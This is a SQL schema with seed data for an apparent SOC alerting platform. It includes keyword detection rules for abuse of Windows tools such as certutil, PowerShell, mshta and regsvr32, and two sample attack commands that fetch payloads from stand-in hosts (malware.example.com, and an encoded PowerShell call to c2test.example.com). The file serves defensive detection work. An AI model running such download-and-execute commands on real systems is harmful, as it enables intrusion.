-- 1) soc_role
CREATE TABLE IF NOT EXISTS soc_role (
    role_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    role_name VARCHAR(255) UNIQUE NOT NULL,
    description TEXT
);

-- 2) soc_login
CREATE TABLE IF NOT EXISTS soc_login (
    login_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    role_id INTEGER NOT NULL,
    full_name TEXT NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    phone TEXT,
    password_hash TEXT NOT NULL,
    status VARCHAR(64) NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'inactive')),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    last_login TEXT,
    FOREIGN KEY (role_id) REFERENCES soc_role(role_id)
);

-- 3) soc_host
CREATE TABLE IF NOT EXISTS soc_host (
    host_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    asset_name TEXT,
    hostname VARCHAR(255) UNIQUE NOT NULL,
    ip_address TEXT,
    os_name TEXT,
    os_version TEXT,
    environment VARCHAR(64) NOT NULL DEFAULT 'lab' CHECK (environment IN ('lab', 'prod')),
    criticality VARCHAR(64) NOT NULL DEFAULT 'medium' CHECK (criticality IN ('low', 'medium', 'high')),
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    last_seen TEXT,
    status VARCHAR(64) NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'inactive', 'isolated'))
);

-- 4) soc_agent
CREATE TABLE IF NOT EXISTS soc_agent (
    agent_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    host_id INTEGER NOT NULL,
    agent_uuid VARCHAR(255) UNIQUE NOT NULL,
    agent_name TEXT NOT NULL,
    agent_version TEXT,
    status VARCHAR(64) NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'inactive')),
    last_seen TEXT,
    install_time TEXT,
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE
);

-- 5) soc_user_host (Junction)
CREATE TABLE IF NOT EXISTS soc_user_host (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    user_id INTEGER NOT NULL,
    host_id INTEGER NOT NULL,
    access_level VARCHAR(64) NOT NULL DEFAULT 'editor' CHECK (access_level IN ('owner', 'editor', 'viewer')),
    UNIQUE (user_id, host_id),
    FOREIGN KEY (user_id) REFERENCES soc_login(login_id) ON DELETE CASCADE,
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE
);

-- 6) soc_detection_rule
CREATE TABLE IF NOT EXISTS soc_detection_rule (
    rule_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    rule_name VARCHAR(255) UNIQUE NOT NULL,
    description TEXT,
    technique TEXT,
    severity_default TEXT NOT NULL CHECK (severity_default IN ('low', 'medium', 'high', 'critical')),
    enabled INTEGER NOT NULL DEFAULT 1,
    logic_type VARCHAR(64) NOT NULL DEFAULT 'keyword' CHECK (logic_type IN ('regex', 'keyword', 'sigma')),
    rule_content TEXT NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at TEXT
);

-- 7) soc_process_event
CREATE TABLE IF NOT EXISTS soc_process_event (
    event_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    host_id INTEGER NOT NULL,
    agent_id INTEGER,
    provider VARCHAR(64) NOT NULL DEFAULT 'Sysmon' CHECK (provider IN ('Sysmon', 'Security', 'PowerShell')),
    event_type VARCHAR(64) NOT NULL DEFAULT 'ProcessCreate',
    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    user_name TEXT,
    image_path TEXT,
    process_name TEXT,
    command_line TEXT,
    current_directory TEXT,
    pid INTEGER,
    ppid INTEGER,
    parent_image TEXT,
    parent_command_line TEXT,
    hash_sha256 TEXT,
    raw_event TEXT,
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE,
    FOREIGN KEY (agent_id) REFERENCES soc_agent(agent_id) ON DELETE SET NULL
);

-- 8) soc_alert_reference
CREATE TABLE IF NOT EXISTS soc_alert_reference (
    alert_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    host_id INTEGER NOT NULL,
    agent_id INTEGER,
    event_ref_id INTEGER,
    rule_id INTEGER NOT NULL,
    severity TEXT NOT NULL CHECK (severity IN ('low', 'medium', 'high', 'critical')),
    description TEXT,
    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    status VARCHAR(64) NOT NULL DEFAULT 'new' CHECK (status IN ('new', 'open', 'suppressed', 'closed')),
    confidence_score REAL CHECK (confidence_score >= 0 AND confidence_score <= 100),
    detection_source VARCHAR(64) NOT NULL DEFAULT 'rule' CHECK (detection_source IN ('rule', 'ml', 'hybrid')),
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE,
    FOREIGN KEY (agent_id) REFERENCES soc_agent(agent_id) ON DELETE SET NULL,
    FOREIGN KEY (event_ref_id) REFERENCES soc_process_event(event_id) ON DELETE SET NULL,
    FOREIGN KEY (rule_id) REFERENCES soc_detection_rule(rule_id)
);

-- 9) soc_case
CREATE TABLE IF NOT EXISTS soc_case (
    case_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    title TEXT NOT NULL,
    description TEXT,
    priority VARCHAR(64) NOT NULL DEFAULT 'medium' CHECK (priority IN ('low', 'medium', 'high', 'critical')),
    status VARCHAR(64) NOT NULL DEFAULT 'open' CHECK (status IN ('open', 'in_progress', 'closed')),
    created_by INTEGER NOT NULL,
    assigned_to INTEGER,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    closed_at TEXT,
    FOREIGN KEY (created_by) REFERENCES soc_login(login_id),
    FOREIGN KEY (assigned_to) REFERENCES soc_login(login_id) ON DELETE SET NULL
);

-- 10) soc_case_alerts (Junction)
CREATE TABLE IF NOT EXISTS soc_case_alerts (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    case_id INTEGER NOT NULL,
    alert_id INTEGER NOT NULL,
    added_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    UNIQUE (case_id, alert_id),
    FOREIGN KEY (case_id) REFERENCES soc_case(case_id) ON DELETE CASCADE,
    FOREIGN KEY (alert_id) REFERENCES soc_alert_reference(alert_id) ON DELETE CASCADE
);

-- 11) soc_case_note
CREATE TABLE IF NOT EXISTS soc_case_note (
    note_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    case_id INTEGER NOT NULL,
    author_id INTEGER,
    note_text TEXT NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (case_id) REFERENCES soc_case(case_id) ON DELETE CASCADE,
    FOREIGN KEY (author_id) REFERENCES soc_login(login_id) ON DELETE SET NULL
);

-- 12) soc_acknowledgement
CREATE TABLE IF NOT EXISTS soc_acknowledgement (
    ack_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    alert_id INTEGER NOT NULL,
    user_id INTEGER NOT NULL,
    ack_status TEXT NOT NULL CHECK (ack_status IN ('acknowledged', 'ignored', 'false_positive')),
    note TEXT,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    UNIQUE (alert_id, user_id),
    FOREIGN KEY (alert_id) REFERENCES soc_alert_reference(alert_id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES soc_login(login_id) ON DELETE CASCADE
);

-- 13) soc_forensic_artifact
CREATE TABLE IF NOT EXISTS soc_forensic_artifact (
    artifact_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    case_id INTEGER,
    alert_id INTEGER,
    host_id INTEGER NOT NULL,
    artifact_type TEXT NOT NULL,
    file_path TEXT NOT NULL,
    hash_sha256 TEXT,
    collected_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    collected_by INTEGER,
    notes TEXT,
    FOREIGN KEY (case_id) REFERENCES soc_case(case_id) ON DELETE SET NULL,
    FOREIGN KEY (alert_id) REFERENCES soc_alert_reference(alert_id) ON DELETE SET NULL,
    FOREIGN KEY (host_id) REFERENCES soc_host(host_id) ON DELETE CASCADE,
    FOREIGN KEY (collected_by) REFERENCES soc_login(login_id) ON DELETE SET NULL
);

-- 14) soc_report
CREATE TABLE IF NOT EXISTS soc_report (
    report_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    generated_by INTEGER NOT NULL,
    report_type TEXT NOT NULL CHECK (report_type IN ('daily', 'weekly', 'case_report', 'alert_summary')),
    period_start TEXT,
    period_end TEXT,
    file_path TEXT NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (generated_by) REFERENCES soc_login(login_id)
);

-- 15) soc_audit_log
CREATE TABLE IF NOT EXISTS soc_audit_log (
    audit_id INTEGER PRIMARY KEY AUTO_INCREMENT,
    user_id INTEGER,
    action_type TEXT NOT NULL,
    object_type TEXT,
    object_id INTEGER,
    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    ip_address TEXT,
    details TEXT,
    FOREIGN KEY (user_id) REFERENCES soc_login(login_id) ON DELETE SET NULL
);

-- Indexes
CREATE INDEX idx_process_host_time ON soc_process_event(host_id, timestamp);
CREATE INDEX idx_alert_status_time ON soc_alert_reference(status, timestamp);
CREATE INDEX idx_case_status_created ON soc_case(status, created_at);
CREATE INDEX idx_case_alerts_case ON soc_case_alerts(case_id);
CREATE INDEX idx_case_alerts_alert ON soc_case_alerts(alert_id);
CREATE INDEX idx_audit_user_time ON soc_audit_log(user_id, timestamp);

-- Seed Data
INSERT IGNORE INTO soc_role (role_id, role_name, description) VALUES
(1, 'Manager', 'System manager: enroll endpoints, manage users, configure detection rules'),
(2, 'Analyst', 'SOC analyst: alerts, cases, log queries, forensic investigations');

INSERT IGNORE INTO soc_login (login_id, role_id, full_name, email, phone, password_hash, status) VALUES
(1, 1, 'SOC Manager',  'manager@socflow.local', '555-0101', 'SEED_PENDING', 'active'),
(2, 2, 'SOC Analyst',  'analyst@socflow.local', '555-0102', 'SEED_PENDING', 'active');

INSERT IGNORE INTO soc_host (host_id, asset_name, hostname, ip_address, os_name, os_version, environment, criticality, status) VALUES
(1, 'Finance Server',  'FIN-SRV-01',  '192.168.1.10', 'Windows Server 2019', '1809', 'prod', 'high', 'active'),
(2, 'Dev Workstation', 'DEV-WKST-04', '192.168.1.55', 'Windows 10',         '21H2', 'lab',  'low',  'active');

INSERT IGNORE INTO soc_agent (agent_id, host_id, agent_uuid, agent_name, agent_version, status, last_seen, install_time) VALUES
(1, 1, '550e8400-e29b-41d4-a716-446655440000', 'SOCflow-Agent-Win', '2.0.0', 'active', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP),
(2, 2, '550e8400-e29b-41d4-a716-446655440001', 'SOCflow-Agent-Win', '2.0.0', 'active', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP);

INSERT IGNORE INTO soc_user_host (user_id, host_id, access_level) VALUES
(2, 1, 'editor'),
(2, 2, 'viewer');

INSERT IGNORE INTO soc_detection_rule (rule_id, rule_name, description, technique, severity_default, logic_type, rule_content) VALUES
(1,  'CertUtil File Download',
     'Detects certutil.exe abused as a downloader using -urlcache or -split flags (T1105)',
     'T1105', 'high', 'keyword',
     'process_name:certutil AND command_line_any:urlcache|-urlcache|split'),
(2,  'CertUtil Decode',
     'Detects certutil.exe used to decode obfuscated files via -decode flag (T1140)',
     'T1140', 'medium', 'keyword',
     'process_name:certutil AND command_line_any:-decode|/decode'),
(3,  'PowerShell Encoded Command',
     'Detects PowerShell executing Base64-encoded commands via -enc or -encodedcommand (T1059.001)',
     'T1059.001', 'high', 'keyword',
     'process_name:powershell AND command_line_any:-enc|-encodedcommand'),
(4,  'PowerShell Download Cradle',
     'Detects PowerShell downloading and executing remote content in-memory (T1059.001 fileless delivery)',
     'T1059.001', 'critical', 'keyword',
     'process_name:powershell AND command_line_any:downloadstring|downloadfile|webclient|invoke-webrequest|iwr'),
(5,  'PowerShell Execution Bypass',
     'Detects PowerShell invoked with security-bypass flags to evade policy controls (T1059.001)',
     'T1059.001', 'high', 'keyword',
     'process_name:powershell AND command_line_any:bypass|-nop|-windowstyle hidden|-noninteractive'),
(6,  'MSHTA Remote Execution',
     'Detects MSHTA loading remote HTA content or executing inline scripts (T1218.005)',
     'T1218.005', 'critical', 'keyword',
     'process_name:mshta AND command_line_any:http://|https://|javascript:|vbscript:'),
(7,  'Regsvr32 COM Scriptlet (Squiblydoo)',
     'Detects regsvr32 used to execute remote COM scriptlets, bypassing AppLocker (T1218.010)',
     'T1218.010', 'critical', 'keyword',
     'process_name:regsvr32 AND command_line_any:scrobj.dll|http://|https://|/u|/i:'),
(8,  'WMIC Process Creation',
     'Detects WMIC used to create or manage processes remotely (T1047)',
     'T1047', 'high', 'keyword',
     'process_name:wmic AND command_line_any:process call create|/node:|shadowcopy|/format:'),
(9,  'Msiexec Remote Package Install',
     'Detects msiexec silently installing packages from remote URLs (T1218.007)',
     'T1218.007', 'high', 'keyword',
     'process_name:msiexec AND command_line_any:http://|https://|/q|/quiet|/i'),
(10, 'Rundll32 Script Execution',
     'Detects rundll32 executing scripts or loading DLLs from unusual locations (T1218.011)',
     'T1218.011', 'high', 'keyword',
     'process_name:rundll32 AND command_line_any:javascript:|http://|shell32|advpack|url.dll'),
(11, 'BITSAdmin File Transfer',
     'Detects bitsadmin used to transfer files via BITS jobs, evading network monitoring (T1197)',
     'T1197', 'high', 'keyword',
     'process_name:bitsadmin AND command_line_any:/transfer|/addfile|/download|/upload'),
(12, 'Scheduled Task Persistence',
     'Detects schtasks creating scheduled tasks for persistence or execution (T1053.005)',
     'T1053.005', 'medium', 'keyword',
     'process_name:schtasks AND command_line_any:/create|/sc|/tr|/ru'),
(13, 'Net User Account Manipulation',
     'Detects net.exe adding users or modifying local administrator group membership (T1136, T1087)',
     'T1136', 'high', 'keyword',
     'process_name:net AND command_line_any:user /add|localgroup administrators'),
(14, 'WScript Remote Script Execution',
     'Detects WScript/CScript loading remote scripts or specifying a script engine explicitly (T1059.005)',
     'T1059.005', 'high', 'keyword',
     'process_name:wscript|cscript AND command_line_any:http://|https://|.vbs|/e:vbscript|/e:javascript');

INSERT IGNORE INTO soc_process_event (event_id, host_id, agent_id, provider, event_type, timestamp, user_name, process_name, command_line) VALUES
(1, 1, 1, 'Sysmon', 'ProcessCreate', CURRENT_TIMESTAMP, 'SYSTEM',
 'certutil.exe',
 'certutil.exe -urlcache -split -f http://malware.example.com/payload.exe C:\Windows\Temp\payload.exe'),
(2, 2, 2, 'Sysmon', 'ProcessCreate', CURRENT_TIMESTAMP, 'User1',
 'powershell.exe',
 'powershell.exe -enc ZWNobyAiSGFja2VkIjsgSW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2MydGVzdC5leGFtcGxlLmNvbS9ydW4ucHMx');

INSERT IGNORE INTO soc_audit_log (user_id, action_type, object_type, object_id, details) VALUES
(1, 'SYSTEM_INIT', 'SYSTEM', NULL, '{"message": "SOCflow database initialized"}');
